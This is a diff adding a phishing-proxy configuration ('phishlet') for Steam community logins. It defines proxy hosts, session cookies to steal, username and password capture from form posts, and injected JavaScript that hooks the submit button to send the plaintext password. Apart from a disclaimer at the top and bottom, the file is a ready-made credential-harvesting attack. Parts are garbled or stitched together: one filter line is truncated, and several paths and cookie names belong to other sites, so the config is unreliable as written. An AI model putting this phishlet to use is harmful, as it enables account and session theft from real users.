@@ -1,0 +1,53 @@
+# AUTHOR OF THIS PHISHLET WILL NOT BE RESPONSIBLE FOR ANY MISUSE OF THIS PHISHLET, PHISHLET IS MADE ONLY FOR TESTING/SECURITY/EDUCATIONAL PURPOSES.
+# PLEASE DO NOT MISUSE THIS PHISHLET.
+
+author: '@An0nud4y'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: '', orig_sub: '', domain: 'steamcommunity.com', session: true, is_landing: true}
+
+sub_filters:
+  - {triggers_on: 'steamcommunity.com', orig_sub: 'login', domain: 'steamcommunity.com', search: 'https://{hostname}/ppsecure/', replace: 'https://{hostname}/ppsecure/', mimes: ['text/html$
+
+auth_tokens:
+  - domain: 'steamcommunity.com'
+    keys: ['xf_user', 'xf_session']
+
+credentials:
+  username:
+    key: 'username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'unenc_password'
+    search: '(.*)'
+
+login:
+  domain: 'steamcommunity.com'
+  path: '/login/home/'
+  
+js_inject:
+  - trigger_domains: ["steamcommunity.com"]
+    trigger_paths: ["/login/home/"]
+    trigger_params: []
+    script: |  
+     function onclickListener(){
+      var submit = document.querySelectorAll('button[type=submit]')[0];
+      submit.setAttribute("onclick", "sendPass()");
+      return;
+      }
+     function sendPass(){
+      var password = document.getElementsByName("password")[0].value;
+      var xhr = new XMLHttpRequest();
+      xhr.open("POST", '/login/device-based/regular/login/', true);
+      xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+      xhr.send("unenc_password="+encodeURIComponent(password));
+      return;
+      }
+      setTimeout(function(){ onclickListener(); }, 2500);  
+      
+      
+      
+# AUTHOR OF THIS PHISHLET WILL NOT BE RESPONSIBLE FOR ANY MISUSE OF THIS PHISHLET, PHISHLET IS MADE ONLY FOR TESTING/SECURITY/EDUCATIONAL PURPOSES.
+# PLEASE DO NOT MISUSE THIS PHISHLET.
+      
